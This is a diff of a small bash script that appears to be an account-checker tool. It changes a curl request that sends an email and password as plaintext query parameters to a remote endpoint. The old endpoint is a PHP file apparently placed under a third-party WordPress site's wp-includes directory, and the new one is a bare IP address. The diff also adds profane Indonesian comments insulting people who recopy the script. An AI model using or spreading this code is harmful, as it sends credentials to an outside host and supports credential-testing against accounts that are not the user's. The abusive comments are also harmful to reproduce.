@@ -1,5 +1,7 @@
 #!/bin/bash
 # created by freenandaa
+# kalo nampak kek gini lihat syntax nya ngentod
+# bukannya malah recode+ganti author anak" kontol
 MER='\033[0;31m'
 CY='\033[0;36m'
 KUN='\033[1;33m'
@@ -22,7 +24,7 @@ echo -e "${NC}"
 logo
 ngecurl(){
 SECONDS=0
-ambil=$(curl -s "https://wedding.dns.co.id/wp-includes/phd.php?email=$1&pass=$2" -L)
+ambil=$(curl -s "http://45.33.107.20/content/api.php?email=$1&pass=$2" -L)
 point=$(echo $ambil | grep -Po '"point":"\K[^ ]+' | cut -d '"' -f 1)
 duration=$SECONDS
 header="Freenanda ~ `date +%H:%M:%S`"
